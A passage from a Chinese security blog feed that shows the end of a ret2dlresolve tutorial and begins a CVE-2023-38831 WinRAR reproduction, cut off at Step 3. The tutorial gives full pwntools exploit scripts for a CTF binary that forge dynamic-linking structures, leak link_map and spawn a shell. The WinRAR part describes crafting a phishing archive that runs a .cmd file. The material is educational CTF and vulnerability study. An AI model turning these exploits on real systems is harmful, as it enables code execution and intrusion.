class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level="debug"</span><br><br>elf = ELF(<span class="hljs-string">'./main_partial_relro_32'</span>)<br>sh = process(<span class="hljs-string">'./main_partial_relro_32'</span>)<br>rop = ROP(<span class="hljs-string">'./main_partial_relro_32'</span>)<br><br>sh.recvuntil(<span class="hljs-string">b'Welcome to XDCTF2015~!\n'</span>)<br><br>offset = <span class="hljs-number">0x70</span><br>bss_addr = elf.bss()<br>stack_size = <span class="hljs-number">0x800</span><br><br>stack_base = bss_addr + stack_size + <span class="hljs-number">0x10</span> * <span class="hljs-number">40</span>  <span class="hljs-comment"># stack grows from high address to low address!</span><br><br>rop.raw(<span class="hljs-string">b'a'</span> * offset)<br>rop.read(<span class="hljs-number">0</span>, stack_base, <span class="hljs-number">100</span>)<br>rop.migrate(stack_base)  <span class="hljs-comment"># &lt;-- ebp to bss_addr (pop ebp; ret) and leave to ebp (leave[esp = ebp; pop ebp;]; ret)</span><br><span class="hljs-comment"># notice that the addr stored in stack is stack_base - 4</span><br><br>sh.sendline(rop.chain())<br><br>rop = ROP(<span class="hljs-string">'./main_partial_relro_32'</span>)<br>sh_str = <span class="hljs-string">b"/bin/sh\x00"</span><br><br>plt0 = elf.get_section_by_name(<span class="hljs-string">'.plt'</span>).header.sh_addr<br>got0 = elf.get_section_by_name(<span class="hljs-string">'.got'</span>).header.sh_addr<br><br>rel_plt = elf.get_section_by_name(<span class="hljs-string">'.rel.plt'</span>).header.sh_addr<br>dynsym_addr = elf.get_section_by_name(<span class="hljs-string">'.dynsym'</span>).header.sh_addr<br>dynstr_addr = elf.get_section_by_name(<span class="hljs-string">'.dynstr'</span>).header.sh_addr<br><br>write_reloc_offset = stack_base + <span class="hljs-number">24</span> - rel_plt<br>r_offset = write_got = elf.got[<span class="hljs-string">"write"</span>]<br><br>fake_sym_addr = stack_base + <span class="hljs-number">32</span><br>align = <span class="hljs-number">0x10</span> - ((fake_sym_addr - dynsym_addr) &amp; <span class="hljs-number">0xf</span>) <span class="hljs-comment"># align to 0x10</span><br>fake_sym_addr += align<br>index_dynsym = (fake_sym_addr - dynsym_addr) // <span class="hljs-number">0x10</span><br>fake_str_addr = fake_sym_addr + <span class="hljs-number">16</span><br>st_name = (fake_str_addr - dynstr_addr)<br>fake_write_sym = flat([st_name, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x12</span>])<br><br>r_info = (index_dynsym &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-number">0x7</span><br><br>rop.raw(plt0)  <span class="hljs-comment"># jmp plt[0]</span><br>rop.raw(write_reloc_offset)  <span class="hljs-comment"># push offset</span><br>rop.raw(<span class="hljs-string">'fake'</span>)  <span class="hljs-comment"># fake ret</span><br>rop.raw(stack_base + <span class="hljs-number">80</span>)<br>rop.raw(<span class="hljs-number">0</span>)<br>rop.raw(<span class="hljs-number">0</span>)<br><br><span class="hljs-string">'''</span><br><span class="hljs-string">rop.write(1, stack_base + 80, len(sh_str))</span><br><span class="hljs-string">execve("/bin/sh", 0, 0)</span><br><span class="hljs-string">'''</span><br><br><span class="hljs-comment"># fake .rel.plt entry [r_offset, r_info]</span><br>rop.raw(r_offset)<br>rop.raw(r_info)<br><br><span class="hljs-comment"># fake .dynsym entry</span><br>rop.raw(<span class="hljs-string">b'a'</span> * align)<br>rop.raw(fake_write_sym)<br><br><span class="hljs-comment"># fake .dynstr</span><br>rop.raw(<span class="hljs-string">b'execve\x00'</span>)<br><br>rop.raw(<span class="hljs-string">b'a'</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br>rop.raw(sh_str)<br>rop.raw(<span class="hljs-string">b'a'</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br><br>sh.sendline(rop.chain())<br><br>sh.interactive()<br></code></pre></td></tr></tbody></table></figure><p>结果成了：</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/13.png"></p><blockquote><p>可能会存在的问题：</p><ul><li>Glibc解析动态链接时可能存在version-hash混淆问题，具体详见<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/#stage-4">ret2dlresolve - CTF Wiki (ctf-wiki.org)</a></li></ul></blockquote><p>除此之外，你也可以使用基于工具的伪造，如Roputil或pwntools：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary = elf = ELF(<span class="hljs-string">"./main_partial_relro_32"</span>)<br>rop = ROP(context.binary)<br>dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="hljs-string">"system"</span>,args=[<span class="hljs-string">"/bin/sh"</span>])<br><span class="hljs-comment"># pwntools will help us choose a proper addr</span><br><span class="hljs-comment"># https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237</span><br>rop.read(<span class="hljs-number">0</span>,dlresolve.data_addr)<br>rop.ret2dlresolve(dlresolve)<br>raw_rop = rop.chain()<br>io = process(<span class="hljs-string">"./main_partial_relro_32"</span>)<br>io.recvuntil(<span class="hljs-string">"Welcome to XDCTF2015~!\n"</span>)<br>payload = flat({<span class="hljs-number">112</span>:raw_rop,<span class="hljs-number">256</span>:dlresolve.payload})<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></tbody></table></figure><h3 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h3><p>如下编译源文件：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -fno-stack-protector -m32 -z relro -z now -no-pie ../../main.c -o main_partial_relro_32<br></code></pre></td></tr></tbody></table></figure><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/14.png"></p><p>开启了<code>Full RELRO</code>之后，所有GOT表中的函数都会在程序执行前被动态载入，如下所示：</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/15.png"></p><p>除此之外，我们再来看一下GOT表的情况：</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/17.png"></p><p>我们可以看到<code>link_map</code>地址和<code>_dl_runtime_resolve()</code>的地址都已被设置为0了。这样一来，在不知道<code>_dl_runtime_resolve()</code>地址和<code>link_map</code>信息的前提下，我们是没有办法进行攻击的。参考资料[3]的论文给出了一种攻击手段，主要通过<strong>信息泄露</strong>来获得相关信息：</p><p><span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>link_map</code>地址：从<code>DT_DEBUG</code>中进行恢复</p><p>这里需要介绍一下<code>DT_DEBUG</code>存放的<code>r_debug</code>结构体：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">r_debug</span><br>  {<br>    <span class="hljs-comment">/* Version number for this protocol.  It should be greater than 0.  */</span><br>    <span class="hljs-type">int</span> r_version;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">link_map</span> *r_map;<span class="hljs-comment">/* Head of the chain of loaded objects.  */</span><br>    <span class="hljs-comment">/* This is the address of a function internal to the run-time linker,</span><br><span class="hljs-comment">       that will always be called when the linker begins to map in a</span><br><span class="hljs-comment">       library or unmap it, and again when the mapping change is complete.</span><br><span class="hljs-comment">       The debugger can set a breakpoint at this address if it wants to</span><br><span class="hljs-comment">       notice shared object mapping changes.  */</span><br>    <span class="hljs-built_in">ElfW</span>(Addr) r_brk;<br>    <span class="hljs-keyword">enum</span><br>      {<br><span class="hljs-comment">/* This state value describes the mapping change taking place when</span><br><span class="hljs-comment">   the `r_brk' address is called.  */</span><br>RT_CONSISTENT,<span class="hljs-comment">/* Mapping change is complete.  */</span><br>RT_ADD,<span class="hljs-comment">/* Beginning to add a new object.  */</span><br>RT_DELETE<span class="hljs-comment">/* Beginning to remove an object mapping.  */</span><br>      } r_state;<br>    <span class="hljs-built_in">ElfW</span>(Addr) r_ldbase;<span class="hljs-comment">/* Base address the linker is loaded at.  */</span><br>  };<br></code></pre></td></tr></tbody></table></figure><p>其中<code>r_map</code>指针就是<code>link_map</code>的地址，这样一来我们就通过<code>r_debug</code>结构体的信息泄露得到了<code>link_map</code>的地址；</p><p><span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>_dl_runtime_resolve()</code>的地址</p><p><code>_dl_runtime_resolve()</code>地址的恢复是很巧妙的，其主要的思想是通过访问应用载入库中没有被Full RELRO保护的ELF目标，然后获得该目标中的<code>_dl_runtime_resolve()</code>的地址。这里通过访问上述<code>link_map</code>的<code>l_next</code>对象来遍历所有载入的ELF目标的<code>link_map</code>信息，然后根据<code>DT_PLTGOT</code>是否为0来判断该目标是否可利用（如果为0，可能是Full RELRO保护的目标或者静态库）。如果目标可利用，那么根据GOT表的信息即可得到<code>_dl_runtime_resolve()</code>的地址。</p><p>在获取上述两个地址之后，我们就可以使用Partial RELRO中的攻击手段进行攻击。</p><p>我们稍微简单的总结一下Full RELRO的攻击手段：</p><ol><li><p>根据<code>DT_DEBUG</code>泄露的信息得到<code>link_map</code>地址；</p></li><li><p>遍历<code>link_map</code>链表中其他所有的<code>link_map</code>，找到可利用的<code>_dl_runtime_resolve()</code>的地址；</p></li><li><p>提前将<code>reloc_offset</code>和<code>link_map</code>压入堆栈，程序执行流调用<code>_dl_runtime_resolve()</code>;</p></li><li><p><code>reloc_offset</code>指向我们构造的虚假的<code>.rel.plt</code> [r_offset, r_info] 结构；</p><p><strong>这里需要注意的是<code>r_offset</code>成员必须指向一个可以写的内存空间，否则在调用完<code>_dl_runtime_resolve()</code>时会报错！</strong></p></li><li><p><code>r_info</code>的高8位为<code>.dynsym</code> [st_name, …, …, …] 结构的偏移量，其中<code>st_name</code>查找函数名在虚假的<code>.dyn.str</code>字符串中的偏移量（因此这里还需要构造一个虚假的<code>.dyn.str</code>结构）；</p></li><li><p>至此，攻击链构造完毕:happy: 。</p></li></ol><p><strong>EXP：</strong></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding=utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level="debug"</span><br><br>sh = process(<span class="hljs-string">"./main_full_relro_32"</span>)<br>rop = ROP(<span class="hljs-string">"./main_full_relro_32"</span>)<br>elf = ELF(<span class="hljs-string">"./main_full_relro_32"</span>)<br><br>r_debug = elf.get_section_by_name(<span class="hljs-string">'.dynamic'</span>).header.sh_addr + <span class="hljs-number">25</span> * <span class="hljs-number">4</span><br><br>offset = <span class="hljs-number">0x70</span><br>bss_addr = elf.bss()<br>stack_size = <span class="hljs-number">0x800</span><br>stack_base = bss_addr + stack_size;<br>sh_str = <span class="hljs-string">b'/bin/sh\x00'</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change_stack_addr</span>(<span class="hljs-params">stack_base</span>):<br>    <span class="hljs-keyword">if</span> stack_base != bss_addr + stack_size:<br>        stack_base = bss_addr + stack_size<br>    <span class="hljs-keyword">else</span>:<br>        stack_base = bss_addr + stack_size - <span class="hljs-number">0x100</span><br>    <span class="hljs-keyword">return</span> stack_base<br><br><span class="hljs-comment"># first leak r_debug</span><br>sh.recvuntil(<span class="hljs-string">b'Welcome to XDCTF2015~!\n'</span>)<br><br>stack_base = change_stack_addr(stack_base)<br>rop.raw(<span class="hljs-string">b'a'</span> * offset)<br>rop.write(<span class="hljs-number">1</span>, r_debug, <span class="hljs-number">4</span>)<br>rop.read(<span class="hljs-number">0</span>, stack_base, <span class="hljs-number">100</span>)<br>rop.migrate(stack_base)<br>sh.sendline(rop.chain())<br>r_debug_addr = u32(sh.recv(<span class="hljs-number">4</span>))<br><br><span class="hljs-comment"># second leak r_map (link_map)</span><br>stack_base = change_stack_addr(stack_base)<br>rop = ROP(<span class="hljs-string">"./main_full_relro_32"</span>)<br>rop.write(<span class="hljs-number">1</span>, r_debug_addr + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>)<br>rop.read(<span class="hljs-number">0</span>, stack_base, <span class="hljs-number">100</span>)<br>rop.migrate(stack_base)<br>sh.sendline(rop.chain())<br>r_map_addr = link_map_addr = u32(sh.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">"[*] The address of link_map is"</span>, <span class="hljs-built_in">hex</span>(r_map_addr))<br><br><span class="hljs-comment"># third find _dl_runtime_resolve</span><br><span class="hljs-comment"># traverse the linked list of linkmap to find _dl_runtime_resolve() addr</span><br>link_map_l_next_addr = link_map_addr<br>is_found = <span class="hljs-literal">False</span><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    stack_base = change_stack_addr(stack_base) <br>    rop = ROP(<span class="hljs-string">"./main_full_relro_32"</span>)<br>    link_map_l_next = link_map_l_next_addr + <span class="hljs-number">3</span> * <span class="hljs-number">4</span><br>    rop.write(<span class="hljs-number">1</span>, link_map_l_next, <span class="hljs-number">4</span>)<br>    rop.read(<span class="hljs-number">0</span>, stack_base, <span class="hljs-number">100</span>)<br>    rop.migrate(stack_base)<br>    sh.sendline(rop.chain())<br>    link_map_l_next_addr = u32(sh.recv(<span class="hljs-number">4</span>))<br>    <br>    <span class="hljs-keyword">if</span> link_map_l_next_addr == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[*] The address of next link_map is"</span>, <span class="hljs-built_in">hex</span>(link_map_l_next_addr))<br>    <br>    dyn_pltgot_ptr_addr = link_map_l_next_addr + <span class="hljs-number">8</span> * <span class="hljs-number">4</span> + <span class="hljs-number">3</span> * <span class="hljs-number">4</span><br>    stack_base = change_stack_addr(stack_base)<br>    rop = ROP(<span class="hljs-string">"./main_full_relro_32"</span>)<br>    rop.write(<span class="hljs-number">1</span>, dyn_pltgot_ptr_addr, <span class="hljs-number">4</span>)<br>    rop.read(<span class="hljs-number">0</span>, stack_base, <span class="hljs-number">100</span>)<br>    rop.migrate(stack_base)<br>    sh.sendline(rop.chain())<br>    elf_pltgot_ptr_addr = u32(sh.recv(<span class="hljs-number">4</span>))<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"  [*] The address of pltgot_ptr is"</span>, <span class="hljs-built_in">hex</span>(elf_pltgot_ptr_addr))<br>    <br>    <span class="hljs-keyword">if</span> elf_pltgot_ptr_addr == <span class="hljs-number">0</span>:<br>         <span class="hljs-built_in">print</span>(<span class="hljs-string">"  [*] This elf is static linked or full relro"</span>)<br>         <span class="hljs-keyword">continue</span><br>    <br>    stack_base = change_stack_addr(stack_base)<br>    rop = ROP(<span class="hljs-string">"./main_full_relro_32"</span>)<br>    rop.write(<span class="hljs-number">1</span>, elf_pltgot_ptr_addr + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>)<br>    rop.read(<span class="hljs-number">0</span>, stack_base, <span class="hljs-number">100</span>)<br>    rop.migrate(stack_base)<br>    sh.sendline(rop.chain())<br>    real_plt_got_addr = u32(sh.recv(<span class="hljs-number">4</span>))<br>    <br>    stack_base = change_stack_addr(stack_base)<br>    rop = ROP(<span class="hljs-string">"./main_full_relro_32"</span>)<br>    rop.write(<span class="hljs-number">1</span>, real_plt_got_addr + <span class="hljs-number">8</span>, <span class="hljs-number">4</span>)<br>    rop.read(<span class="hljs-number">0</span>, stack_base, <span class="hljs-number">100</span>)<br>    rop.migrate(stack_base)<br>    sh.sendline(rop.chain())<br>    dl_runtime_addr = u32(sh.recv(<span class="hljs-number">4</span>))<br>    <br>    <span class="hljs-keyword">if</span> dl_runtime_addr == <span class="hljs-number">0</span>:<br>         <span class="hljs-built_in">print</span>(<span class="hljs-string">"  [*] This elf is static linked or full relro"</span>)<br>         <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>         <span class="hljs-built_in">print</span>(<span class="hljs-string">"  [*] Found it! The address of _dl_runtime_resolve() is"</span>, <span class="hljs-built_in">hex</span>(dl_runtime_addr))<br>         is_found = <span class="hljs-literal">True</span><br>         <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_found:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[*] Attack Failed! Could not find address of _dl_runtime_resolve()."</span>)<br>    exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># use dl_runtime_addr and link_map_addr</span><br>rop = ROP(<span class="hljs-string">"./main_full_relro_32"</span>)<br>stack_base = bss_addr + <span class="hljs-number">800</span><br>rop.read(<span class="hljs-number">0</span>, stack_base, <span class="hljs-number">100</span>)<br>rop.migrate(stack_base)<br>sh.sendline(rop.chain())<br><br>rel_plt = elf.get_section_by_name(<span class="hljs-string">'.rel.plt'</span>).header.sh_addr<br>dynsym_addr = elf.get_section_by_name(<span class="hljs-string">'.dynsym'</span>).header.sh_addr<br>dynstr_addr = elf.get_section_by_name(<span class="hljs-string">'.dynstr'</span>).header.sh_addr<br><br>write_reloc_offset = stack_base + <span class="hljs-number">28</span> - rel_plt<br>r_offset = stack_base + <span class="hljs-number">36</span><br><br>fake_sym_addr = stack_base + <span class="hljs-number">40</span><br>align = <span class="hljs-number">0x10</span> - ((fake_sym_addr - dynsym_addr) &amp; <span class="hljs-number">0xf</span>)<br>fake_sym_addr += align<br>index_dynsym = (fake_sym_addr - dynsym_addr) // <span class="hljs-number">0x10</span><br>fake_str_addr = fake_sym_addr + <span class="hljs-number">16</span><br>st_name = (fake_str_addr - dynstr_addr)<br>fake_write_sym = flat([st_name, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x12</span>])<br><br>r_info = (index_dynsym &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-number">0x7</span><br><br>rop = ROP(<span class="hljs-string">"./main_full_relro_32"</span>)<br>rop.raw(dl_runtime_addr)<br>rop.raw(link_map_addr)<br>rop.raw(write_reloc_offset)<br>rop.raw(<span class="hljs-string">b'bbbb'</span>)<br>rop.raw(stack_base + <span class="hljs-number">80</span>)<br>rop.raw(<span class="hljs-number">0</span>)<br>rop.raw(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># fake .rel.plt [r_offset(fake!), r_info]</span><br>rop.raw(r_offset)<br>rop.raw(r_info)<br>rop.raw(<span class="hljs-string">b'bbbb'</span>)<br><br><span class="hljs-comment"># fake .dynsym entry</span><br>rop.raw(<span class="hljs-string">b'a'</span> * align)<br>rop.raw(fake_write_sym)<br><br><span class="hljs-comment"># fake .dynstr</span><br>rop.raw(<span class="hljs-string">b'execve\x00'</span>)<br><br>rop.raw(<span class="hljs-string">b'a'</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br>rop.raw(sh_str)<br>sh.sendline(rop.chain())<br><br>sh.interactive()<br></code></pre></td></tr></tbody></table></figure><p>运行结果：</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/16.png"></p><h2 id="link-Reference："><a href="#link-Reference：" class="headerlink" title=":link: Reference："></a><span class="github-emoji"><span>🔗</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f517.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> Reference：</h2><ol><li><a href="https://ypl.coffee/dl-resolve/">Understanding _dl_runtime_resolve() - Peilin Ye’s blog (ypl.coffee)</a>  <span class="github-emoji"><span>⭐</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>强烈推荐这一篇文章！！ 不看我真的会哭的~</li><li><a href="https://ctf-wiki.org/executable/elf/linking/symbol-resolve/">Symbol Reslove - CTF Wiki (ctf-wiki.org)</a> 经典文章了</li><li>Di Federico, Alessandro, et al. “How the {ELF} Ruined Christmas.” <em>24th USENIX Security Symposium (USENIX Security 15)</em>. 2015.</li><li>[link.h source code <a href="https://codebrowser.dev/glibc/glibc/include/link.h.html#link_map">glibc/include/link.h] - Codebrowser</a></li><li>[elf.h source code <a href="https://codebrowser.dev/glibc/glibc/elf/elf.h.html">glibc/elf/elf.h] - Codebrowser</a></li><li><a href="https://www.testzero-wz.com/2022/03/05/Ret2dlresolve%E2%80%94%E2%80%94%E4%BB%8ENo-RELRO%E5%88%B0FULL-RELRO/#full_relero">Ret2dlresolve攻击——从No RELRO到FULL RELRO | T3stzer0’s Blog (testzero-wz.com)</a></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>栈溢出漏洞利用</tag>
      
      <tag>ret2dlresolve</tag>
      
      <tag>linux动态链接</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-38831（WinRAR）漏洞分析</title>
    <link href="/2023/09/18/CVE-2023-38831%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2023/09/18/CVE-2023-38831%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-38831（WinRAR）漏洞分析"><a href="#CVE-2023-38831（WinRAR）漏洞分析" class="headerlink" title="CVE-2023-38831（WinRAR）漏洞分析"></a>CVE-2023-38831（WinRAR）漏洞分析</h1><h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h2><p><code>CVE-2023-38831</code>是<code>WinRAR</code>（&lt;=<code>6.22</code>）版本中存在的<strong>可执行任意恶意代码</strong>的漏洞，该漏洞需要被攻击的用户双击压缩包中的文件，随后恶意代码将会在被攻击用户的电脑中运行，因此此漏洞可用于<strong>钓鱼</strong>。</p><h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2. 漏洞复现"></a>2. 漏洞复现</h2><p>复现环境与软件：<code>Windows</code>操作系统、<code>WinRAR</code>（&lt;=<code>6.22</code>）、二进制编辑器（如<code>WinHex</code>）</p><h3 id="Step1-文件准备"><a href="#Step1-文件准备" class="headerlink" title="Step1 文件准备"></a>Step1 文件准备</h3><p>需要准备的文件及其结构如下所示：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">FILE_NAME.xxxA<br>---- FILE_NAME.xxx .cmd  <span class="hljs-comment"># 执行恶意代码</span><br>FILE_NAME.xxxB<br></code></pre></td></tr></tbody></table></figure><p>其中<code>FILE_NAME.xxxA</code>为文件夹，而<code>FILE_NAME.xxxB</code>为文件，文件夹名和文件只有一个字符上的区别，此外<code>xxx</code>为文件的后缀名。e.g.</p><p><img src="/2023/09/18/CVE-2023-38831%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1.png"></p><h3 id="Step2-压缩为ZIP文件"><a href="#Step2-压缩为ZIP文件" class="headerlink" title="Step2 压缩为ZIP文件"></a>Step2 压缩为ZIP文件</h3><p>将上述<code>FILE_NAME.xxxA</code>文件夹和<code>FILE_NAME.xxxB</code>文件压缩为<strong>ZIP</strong>（请注意，这里请选择压缩为ZIP，否则后续打开时压缩包会显示损坏）：</p><p><img src="/2023/09/18/CVE-2023-38831%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2.png"></p><h3 id="Step3-修改ZIP文件"><a href="#Step3-修改ZIP文件" class="headerlink" title="Step3 修改ZIP文件"></a>Step3 